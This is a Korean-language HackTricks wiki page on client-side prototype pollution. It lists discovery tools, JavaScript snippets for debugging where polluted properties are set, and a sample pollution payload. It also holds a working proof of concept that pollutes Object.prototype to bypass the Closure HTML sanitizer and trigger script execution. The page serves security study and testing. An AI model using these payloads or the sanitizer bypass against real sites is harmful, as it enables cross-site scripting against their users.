# 클라이언트 측 프로토타입 오염

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 자동 도구를 사용하여 발견하기

도구 [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **및** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find)은 **프로토타입 오염 취약점을 찾는 데 사용**될 수 있습니다.

또한 **브라우저 확장 프로그램** [**PPScan**](https://github.com/msrkp/PPScan)을 사용하여 **액세스하는 페이지**를 **자동으로 스캔**하여 프로토타입 오염 취약점을 찾을 수 있습니다.

### 속성이 사용되는 위치 디버깅 <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### 프로토타입 오염의 근본 원인 찾기 <a href="#5530" id="5530"></a>

프로토타입 오염 취약점이 도구 중 하나에 의해 식별되었고 코드가 복잡하지 않은 경우, Chrome 개발자 도구에서 `location.hash`, `decodeURIComponent`, 또는 `location.search`와 같은 키워드를 검색하여 취약한 JavaScript 코드의 위치를 정확히 찾을 수 있습니다.

더 크고 복잡한 코드베이스의 경우, 취약한 코드를 발견하기 위해 다음 단계를 따를 수 있습니다:

1. 도구를 사용하여 취약점을 식별하고 생성자에 속성을 설정하는 페이로드를 얻습니다. ppmap에서 제공하는 예시는 다음과 같을 수 있습니다: `constructor[prototype][ppmap]=reserved`.
2. 페이지에서 실행될 첫 번째 JavaScript 코드의 첫 줄에 중단점을 설정합니다. 페이로드를 사용하여 페이지를 새로 고침하면 이 중단점에서 실행이 일시 중지됩니다.
3. JavaScript 실행이 일시 중지된 동안 JS 콘솔에서 다음 스크립트를 실행합니다. 이 스크립트는 'ppmap' 속성이 생성될 때 신호를 보내어 원본을 찾는 데 도움이 됩니다:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. **소스** 탭으로 돌아가서 "스크립트 실행 재개"를 선택합니다. JavaScript가 계속 실행되고 'ppmap' 속성이 예상대로 오염됩니다. 제공된 코드 조각을 사용하면 'ppmap' 속성이 오염된 정확한 위치를 식별할 수 있습니다. **호출 스택**을 검사하여 오염이 발생한 다른 스택을 확인할 수 있습니다.

조사할 스택을 결정할 때, 프로토타입 오염이 자주 발생하는 JavaScript 라이브러리 파일과 관련된 스택을 대상으로 하는 것이 유용합니다. 라이브러리 파일에 연결된 해당 스택을 확인하여 관련 스택을 식별합니다(오른쪽에 표시되는 이미지와 유사한 방식으로 확인 가능). 4번째 줄과 6번째 줄과 같이 여러 스택이 있는 경우, 오염의 초기 발생을 나타내는 4번째 줄의 스택을 선택하는 것이 논리적인 선택입니다. 스택을 클릭하면 취약한 코드로 이동합니다.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## 스크립트 가젯 찾기

가젯은 **PP 취약점이 발견된 후 악용될 코드**입니다.

응용 프로그램이 간단한 경우, **`srcdoc/innerHTML/iframe/createElement`**과 같은 **키워드**를 **검색**하여 소스 코드를 검토하고 **자바스크립트 실행으로 이어지는지** 확인할 수 있습니다. 때로는 언급된 기술로 가젯을 찾을 수 없을 수도 있습니다. 이 경우, 순수한 소스 코드 검토를 통해 아래 예시와 같은 좋은 가젯을 찾을 수 있습니다.

### Mithil 라이브러리 코드에서 PP 가젯 찾기 예시

다음 글을 확인하세요: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## 취약한 라이브러리에 대한 페이로드 재컴파일

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PP를 통한 HTML 산탄화기 우회

[**이 연구**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)는 일부 HTML 산탄화기 라이브러리에서 제공하는 **살화 기법을 우회**하는 데 사용할 수 있는 PP 가젯을 보여줍니다:

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* #### Closure
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## 참고 자료

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
